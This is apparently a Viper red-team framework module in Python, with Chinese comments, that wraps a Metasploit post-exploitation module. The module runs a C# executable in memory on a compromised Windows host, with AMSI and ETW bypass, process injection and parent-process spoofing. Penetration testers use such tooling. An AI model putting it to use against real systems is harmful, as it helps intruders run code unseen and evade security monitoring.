# -*- coding: utf-8 -*-
# @File  : SimpleRewMsfModule.py
# @Date  : 2019/1/11
# @Desc  :

import base64

from Lib.ModuleAPI import *


class PostModule(PostMSFRawModule):
    NAME = "内存执行C#可执行文件(Bypass)"
    DESC = "模块将C#编写的exe文件加载到内存中,然后使用CLR执行.\n" \
           "需要已控主机安装.net2.0（win2008默认安装）或.net4.0（win2012默认安装）.\n" \
           "可执行文件需要与已控主机.net版本相同.\n" \
           "功能类似CS的execute-assembly,当C#需要输入参数时需要确保填写参数.\n" \
           "本模块新增了BypassETW及BypassAmsi功能,但模块只适用于x64位系统"

    MODULETYPE = TAG2CH.Defense_Evasion
    PLATFORM = ["Windows"]  # 平台
    PERMISSIONS = ["User", "Administrator", "SYSTEM"]  # 所需权限
    ATTCK = ["T1055"]  # ATTCK向量
    README = ["https://www.yuque.com/vipersec/module/gws5hr"]
    REFERENCES = ["https://attack.mitre.org/techniques/T1050/"]
    AUTHOR = "Viper"

    REQUIRE_SESSION = True
    OPTIONS = register_options([
        OptionFileEnum(ext=['exe', 'EXE']),
        OptionStr(name='ARGUMENTS', name_tag="命令行参数", option_length=24, desc="运行exe时输入的参数"),
        OptionIntger(name='WAIT', name_tag="等待时间", desc="读取输出前等待时间", default=10),
        OptionBool(name='KILL', name_tag="结束进程", desc="执行完成后结束C#进程", default=True),
        OptionEnum(name="Signature", name_tag="入口函数", desc="C#程序的入口函数", default="Main(string[])",
                   enum_list=[
                       {'name': "Main()", 'value': "Main()"},
                       {'name': "Main(string[])", 'value': "Main(string[])"},
                   ]),

        OptionStr(name='PROCESS', name_tag="新进程名", option_length=6, default="notepad.exe", desc="新启动进程名称"),
        OptionIntger("PID", name_tag="PID", desc="注入的进程pid(0表示新建进程)", default=0),
        OptionIntger("PPID", name_tag="PPID", desc="新建进程时,伪装的PPID(父进程id)", default=0)
    ])

    def __init__(self, sessionid, hid, custom_param):
        super().__init__(sessionid, hid, custom_param)
        self.type = "post"
        self.mname = "windows/manage/execute_dotnet_assembly_api"

    def check(self):
        """执行前的检查函数"""
        session = Session(self._sessionid)
        if not session.is_windows:
            return False, "此模块只支持Windows的Meterpreter"

        exe_file = self.get_option_filename()
        if exe_file is None:
            return False, "请选择执行exe文件,文件后缀必须为exe"
        else:
            self.set_option(key='ASSEMBLY', value=exe_file)

        arguments = self.param("ARGUMENTS")
        if arguments is None:
            arguments = ""
        self.set_option(key='ARGUMENTS', value=arguments)

        wait = self.param("WAIT")
        self.set_option(key='WAIT', value=wait)
        kill = self.param("KILL")
        self.set_option(key='KILL', value=kill)

        Signature = self.param("Signature")
        self.set_option(key='Signature', value=Signature)

        PID = self.param("PID")
        PPID = self.param("PPID")
        PROCESS = self.param("PROCESS")
        if PID != 0 and PPID != 0:
            return False, "不能同时指定PID及PPID"
        self.set_option(key='PID', value=PID)
        self.set_option(key='PPID', value=PPID)
        self.set_option(key='PROCESS', value=PROCESS)

        return True, None

    def callback(self, status, message, data):
        if status is not True:
            self.log_error("模块执行失败,失败原因:{}".format(message))
        else:
            assembly_out = base64.b64decode(data).decode('utf-8', errors="ignore")
            if assembly_out is None or len(assembly_out) == 0:
                self.log_warning("exe文件未输出信息")
                if self.param("ARGUMENTS") is None or len(self.param("ARGUMENTS")) == 0:
                    self.log_warning("如果exe程序接受参数输入，请尝试输入参数")
            else:
                self.log_good("exe执行完成,输出信息:")
                try:

                    self.log_raw(base64.b64decode(data).decode('utf-8', errors="ignore"))
                except Exception as E:
                    print(E)
                    self.log_raw(data)
